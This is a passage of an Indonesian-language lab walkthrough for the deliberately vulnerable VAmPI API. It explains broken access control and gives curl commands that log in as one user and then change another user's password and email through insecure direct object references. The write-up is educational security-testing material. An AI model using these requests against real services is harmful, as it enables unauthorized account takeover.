# Unauthorized Password Change
Access Control menerapkan kebijakan sedemikian rupa sehingga pengguna tidak dapat bertindak di luar izin yang dimaksudkan. Kegagalan otorisasi biasanya menyebabkan pengungkapan informasi yang tidak sah, modifikasi, penghapusan data atau pelaksanaan fungsi bisnis lain di luar batas pengguna. Misalnya adalah mengizinkan melihat atau mengedit akun orang lain, dengan memberikan pengenal uniknya (insecure direct object references)

- Login terlebih dahulu untuk mengakses endpoint `/users/v1/{username}/password`
```sh
curl http://IP_Server:5000/users/v1/login -d '{"username":"test","password":"test"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%202.JPG)

- Setelah kita login sebagai user `test` sekarang kita coba mengubah password user `name1` melalui endpoint `/users/v1/{username}/password`
```sh
curl -X PUT http://IP_Server:5000/users/v1/name1/password -d '{"password":"testing"}' -H 'Authorization: Bearer token' -H 'Content-Type: application/json' -H "Accept: application/json" --proxy http://127.0.0.1:8080 -v
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%204.JPG)

- Disini kita berhasil mengubah password user `name1` meskipun kita login sebagai user `test`. Di sisi lain kita juga bisa mengubah email user `name1` melalui endpoint `/users/v1/{username}/email`
```sh
curl -X PUT http://IP_Server:5000/users/v1/name1/email -d '{"email":"testing@mail.com"}' -H 'Authorization: Bearer token' -H 'Content-Type: application/json' -H "Accept: application/json" --proxy http://127.0.0.1:8080 -v
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%206.JPG)